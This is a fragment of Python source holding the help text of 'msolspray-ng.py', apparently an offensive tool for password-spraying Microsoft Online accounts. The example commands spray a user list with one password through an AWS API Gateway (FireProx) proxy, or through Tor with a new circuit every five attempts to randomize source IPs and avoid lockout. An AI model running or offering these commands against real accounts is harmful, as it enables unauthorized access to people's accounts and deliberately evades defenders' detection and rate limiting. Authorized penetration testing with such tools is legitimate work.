...
_epilog = (
    ...
    "    python3 msolspray-ng.py --userlist ./userlist.txt --password P@ssword "
    "--url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox "
    "--out valid-users.txt\n"
    "\n"
    "This command will create a new tor circuit every 5 login attempts and use it to "
    "spray from randomized IP addresses.\n"
    "    python3 msolspray-ng.py --userlist ./userlist.txt --password P@ssword "
    "--tor --tor-control-pw H1d3M3 --tor-refresh-interval 5\n"
    "\n"
    "TIPS:\n"
